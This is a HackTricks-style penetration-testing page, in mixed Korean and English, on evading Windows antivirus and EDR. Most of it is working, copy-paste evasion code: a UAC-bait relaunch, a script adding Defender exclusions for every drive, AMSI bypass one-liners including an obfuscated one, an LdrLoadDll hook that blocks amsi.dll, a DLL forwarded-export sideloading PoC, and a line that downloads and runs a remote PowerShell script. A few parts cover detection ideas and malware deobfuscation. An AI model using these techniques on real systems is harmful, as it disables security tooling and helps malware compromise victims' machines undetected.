# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**에 의해 작성되었습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 중지시키는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender가 작동하지 않도록 중지시키는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

게임 치트로 가장한 공개 로더는 종종 서명되지 않은 Node.js/Nexe installers로 배포되며, 먼저 **사용자에게 권한 승격을 요청**하고 그 다음에 Defender를 무력화합니다. 흐름은 간단합니다:

1. `net session`으로 관리자 권한 컨텍스트를 확인합니다. 이 명령은 호출자가 관리자 권한을 가졌을 때만 성공하므로, 실패하면 로더가 일반 사용자로 실행되고 있음을 나타냅니다.
2. 원래 명령줄을 유지한 채 예상되는 UAC 동의 프롬프트를 발생시키기 위해 `RunAs` verb로 즉시 자신을 재실행합니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자들은 이미 'cracked' 소프트웨어를 설치하고 있다고 믿기 때문에, 프롬프트는 보통 수락되어 악성코드가 Defender의 정책을 변경하는 데 필요한 권한을 얻게 된다.

### 모든 드라이브 문자에 대한 포괄적인 `MpPreference` 제외

권한이 상승하면, GachiLoader-style 체인은 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 최대화한다. 로더는 먼저 GUI 감시 프로세스(`taskkill /F /IM SecHealthUI.exe`)를 종료한 다음, **아주 광범위한 제외 항목**을 적용하여 모든 사용자 프로필, 시스템 디렉터리 및 이동식 디스크를 스캔할 수 없게 만든다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- 루프는 모든 마운트된 파일시스템(D:\, E:\, USB sticks 등)을 순회하므로 **디스크 어딘가에 이후에 드롭된 페이로드는 모두 무시된다**.
- `.sys` 확장자 제외 규칙은 향후 지향적이다—공격자는 Defender를 다시 건드리지 않고 나중에 서명되지 않은 드라이버를 로드할 수 있는 옵션을 남겨둔다.
- 모든 변경사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 기록되므로, 이후 단계에서 제외 항목이 유지되는지 확인하거나 UAC를 다시 트리거하지 않고 확장할 수 있다.

Defender 서비스가 중지되지 않기 때문에, 단순한 상태 검사들은 실제 실시간 검사(real-time inspection)가 해당 경로들을 전혀 건드리지 않더라도 “antivirus active”를 계속 보고한다.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

실무적인 AV 회피에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 꼭 확인하길 권한다.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

Microsoft Defender의 Sandbox computername이 HAL9TH인 것으로 밝혀졌으므로, 폭발(detontation) 전에 악성코드에서 컴퓨터 이름을 확인할 수 있다. 이름이 HAL9TH이면 Defender의 sandbox 내부라는 뜻이므로 프로그램을 종료하게 만들면 된다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes에 대응하기 위한 몇 가지 좋은 팁은 [@mgeeky](https://twitter.com/mariuszbit)가 제시한 내용들이다.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이, **public tools**은 결국 **탐지된다**, 그래서 스스로에게 물어봐야 한다:

예를 들어, LSASS를 덤프하려면, **do you really need to use mimikatz**? 아니면 덜 알려진 다른 프로젝트를 사용해도 LSASS를 덤프할 수 있지 않은가?

정답은 아마 후자일 것이다. 예로 mimikatz는 아마 AV와 EDR에서 가장 많이 탐지되는 도구 중 하나일 것이다. 프로젝트 자체는 훌륭하지만 AV를 우회하기 위해 작업하기에는 악몽일 수 있으므로, 달성하려는 목적에 맞는 대안을 찾아라.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일로 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여주겠다.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

저는 **DLL Hijackable/Sideloadable 프로그램을 직접 탐색하는 것**을 강력히 권장합니다. 이 기법은 제대로 수행하면 상당히 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 포착될 수 있습니다.

프로그램이 로드할 것으로 기대하는 이름의 악성 DLL을 단순히 배치하는 것만으로는 payload가 실행되지 않습니다. 프로그램은 해당 DLL 내부에 특정 함수들이 있을 것을 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프로그램이 proxy (and malicious) DLL에서 원래 DLL로 수행하는 호출들을 전달하여 프로그램의 기능을 유지하면서 payload 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)로부터 사용할 것입니다.

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 다음 두 파일을 생성합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **강력히 권합니다** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서에 따라 로드됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사합니다
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을(를) 둡니다. 최소한의 DllMain만으로 코드 실행을 얻을 수 있습니다; DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워드를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (서명됨)은 side-by-side `keyiso.dll` (서명됨)을 로드함
- `KeyIsoSetAuditingInterface`를 해결하는 동안, 로더는 forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동함
- 로더는 이후 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 해당 `DllMain`을 실행함
- 만약 `SetAuditingInterface`가 구현되어 있지 않다면, `DllMain`이 이미 실행된 이후에야 "missing API" 오류가 발생함

Hunting tips:
- 타겟 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열되어 있습니다.
- forwarded exports를 열거할 수 있는 도구로는 다음과 같은 것들이 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 찾으려면 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- LOLBins (예: rundll32.exe)가 시스템 경로가 아닌 위치에서 서명된 DLL을 로드한 뒤, 해당 디렉터리에서 동일한 베이스 이름을 가진 non-KnownDLLs를 로드하는 것을 모니터링하세요
- 사용자 쓰기 가능 경로에서 다음과 같은 프로세스/모듈 체인에 대해 경고하세요: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute를 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용해 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단순한 줄다리기 게임입니다. 오늘 통하는 방법이 내일에는 탐지될 수 있으므로, 가능한 한 단일 도구에만 의존하지 말고 여러 회피 기법을 연결해 사용하세요.

## 직접/간접 Syscalls 및 SSN 해석 (SysWhispers4)

EDRs는 종종 `ntdll.dll`의 syscall stub들에 **user-mode inline hooks**를 설치합니다. 이러한 훅을 우회하려면, 올바른 **SSN** (System Service Number)을 로드하고 훅된 export entrypoint를 실행하지 않고 커널 모드로 전환하는 **direct** 또는 **indirect** syscall stub을 생성할 수 있습니다.

**Invocation options:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` 명령을 삽입합니다 (`ntdll` export를 호출하지 않음).
- **Indirect**: 커널 전환이 `ntdll`에서 시작된 것처럼 보이도록 `ntdll` 내부의 기존 `syscall` gadget으로 점프합니다 (useful for heuristic evasion); **randomized indirect**는 호출마다 풀에서 gadget을 선택합니다.
- **Egg-hunt**: 디스크에 정적 `0F 05` opcode 시퀀스를 포함시키지 말고 런타임에 syscall 시퀀스를 해결합니다.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub 바이트를 읽는 대신 syscall stub들을 가상 주소로 정렬하여 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 매핑하고, 그 `.text`에서 SSN을 읽은 뒤 언맵합니다 (모든 인메모리 훅을 우회).
- **RecycledGate**: stub이 깨끗할 때 VA 정렬 기반 SSN 추론과 opcode 검증을 결합하고, 훅이 걸려있다면 VA 추론으로 대체합니다.
- **HW Breakpoint**: `syscall` 명령에 DR0를 설정하고 VEH를 사용해 런타임에 훅된 바이트를 파싱하지 않고 `EAX`에서 SSN을 캡처합니다.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (안티 멀웨어 스캔 인터페이스)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌다. 초기에는 AVs가 **디스크 상의 파일**만 스캔할 수 있었기 때문에, 페이로드를 **메모리에서 직접 실행**할 수 있으면 AV가 이를 막을 수 있는 가시성이 부족했다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있다.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이는 안티바이러스 솔루션이 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있게 한다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생한다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 접두사로 붙이고 그 다음에 스크립트가 실행된 실행 파일 경로를 표시하는 것을 볼 수 있다. 이 경우 powershell.exe다.

우리는 디스크에 어떤 파일도 떨어뜨리지 않았지만, AMSI 때문에 메모리에서 실행되는 동안 탐지되었다.

더욱이, **.NET 4.8**부터는 C# 코드도 AMSI를 통과하게 된다. 이는 `Assembly.Load(byte[])`로 메모리 내에서 로드하는 경우에도 영향을 미친다. 따라서 AMSI를 회피하려면 메모리 실행 시 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장된다.

AMSI를 우회하는 방법은 몇 가지가 있다.

- **Obfuscation**

AMSI는 주로 정적 탐지에 의존하기 때문에 로드하려는 스크립트를 수정하는 것은 탐지를 회피하는 좋은 방법이 될 수 있다.

그러나 AMSI는 여러 레이어로 난독화되어 있어도 스크립트를 역난독화할 수 있는 능력이 있기 때문에, obfuscation은 어떻게 했느냐에 따라 좋지 않은 선택이 될 수 있다. 따라서 완전히 단순하지는 않다. 때때로 변수명 몇 개만 바꿔도 통과되는 경우도 있으므로, 얼마나 심하게 플래그되었느냐에 따라 달라진다.

- **AMSI Bypass**

AMSI는 powershell 프로세스(또는 cscript.exe, wscript.exe 등)에 DLL을 로드하는 방식으로 구현되기 때문에, 권한이 없는 사용자로 실행 중일 때도 쉽게 조작할 수 있다. AMSI 구현의 이 결함 때문에 연구자들은 AMSI 스캔을 회피하는 여러 방법을 찾아냈다.

**Forcing an Error**

AMSI 초기화를 실패하도록 강제(amsiInitFailed)하면 현재 프로세스에 대해 스캔이 시작되지 않는다. 원래 이것은 [Matt Graeber](https://twitter.com/mattifestation)이 공개했으며 Microsoft는 더 넓은 사용을 막기 위한 시그니처를 개발했다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
단 한 줄의 powershell 코드만으로 현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었다. 이 한 줄은 물론 AMSI 자체에 의해 탐지되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

여기 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass가 있다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, 사용자 입력을 스캔하는 역할을 하는 amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 해당 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔의 결과가 0을 반환하게 되어 클린 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을 읽어보세요.

powershell로 AMSI를 우회하는 다른 많은 기법들도 있으니, 자세한 내용은 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하세요.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 이후에만 초기화됩니다. 강력하고 언어에 구애받지 않는 바이패스는 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 user‑mode hook을 거는 것입니다. 그 결과 AMSI는 로드되지 않으므로 해당 프로세스에 대해 스캔이 수행되지 않습니다.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 커스텀 로더 등 AMSI를 로드하는 모든 환경에서 작동합니다(기본적으로 AMSI를 로드하는 모든 것).
- 긴 커맨드라인 흔적을 피하려면 stdin으로 스크립트를 전달(`PowerShell.exe -NoProfile -NonInteractive -Command -`)하는 방식과 함께 사용하세요.
- LOLBins을 통해 실행되는 로더(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우)에서 사용되는 것이 관찰되었습니다.

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**감지된 시그니처 제거**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 또는 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔해 AMSI 시그니처를 찾은 다음 NOP 명령으로 덮어써서 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**PowerShell 버전 2 사용**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 AMSI로 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 이는 감사 및 문제 해결에 유용할 수 있지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI로 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능 없이 PowerShell을 띄우기 위해 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용하세요 (이것이 `powerpick`이 Cobal Strike에서 사용하는 방식입니다).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (또는 상용 포크)을 사용하는 악성코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 겹의 보호를 마주하는 경우가 흔합니다. 아래 워크플로우는 신뢰할 수 있게 거의 원본 IL을 복원하여 이후 dnSpy나 ILSpy 같은 도구로 C#으로 디컴파일할 수 있게 합니다.

1.  Anti-tampering removal – ConfuserEx는 모든 *method body*를 암호화하고 *module* static constructor(`<Module>.cctor`) 안에서 복호화합니다. 또한 PE checksum을 패치하므로 어떤 수정이든 바이너리를 크래시시킬 수 있습니다. **AntiTamperKiller**를 사용해 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구한 다음 깨끗한 어셈블리를 다시 작성하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 6개의 anti-tamper 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함되어 있으며, 자체 언패커를 만들 때 유용합니다.

2.  Symbol / control-flow recovery – *clean* 파일을 **de4dot-cex**(ConfuserEx 인식 포크)로 처리하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot는 control-flow flattening을 되돌리고 원래 네임스페이스, 클래스 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call stripping – ConfuserEx는 디컴파일을 더 어렵게 하기 위해 직접 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 교체합니다. **ProxyCall-Remover**로 이를 제거하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String`이나 `AES.Create()` 같은 일반적인 .NET API가 보일 것입니다.

4.  Manual clean-up – 결과 바이너리를 dnSpy로 열고 큰 Base64 블롭 또는 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾으세요. 종종 악성코드는 `<Module>.byte_0` 안에서 초기화된 TLV-인코딩된 바이트 배열로 이를 저장합니다.

위 체인은 악성 샘플을 실행하지 않고도 실행 흐름을 복원하므로 오프라인 작업 환경에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성하며, 샘플을 자동 분류하는 IOC로 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화기**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 코드 난독화와 변조 방지를 통해 소프트웨어 보안을 강화하는 것이다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용해 외부 도구나 컴파일러 수정을 사용하지 않고 컴파일 시점에 난독화된 코드를 생성하는 방법을 보여준다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크로 생성된 난독화된 연산 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 더 어렵게 만든다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 x64 바이너리 난독화 도구로 .exe, .dll, .sys 등 다양한 PE 파일을 난독화할 수 있다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의 실행 파일을 위한 간단한 metamorphic code 엔진이다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(return-oriented programming)를 사용하여 LLVM 지원 언어용 세분화된 코드 난독화 프레임워크다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환해 어셈블리 수준에서 프로그램을 난독화함으로써 정상적인 제어 흐름에 대한 일반적 개념을 무력화한다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt은 Nim으로 작성된 .NET PE Crypter다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 후 로드할 수 있다

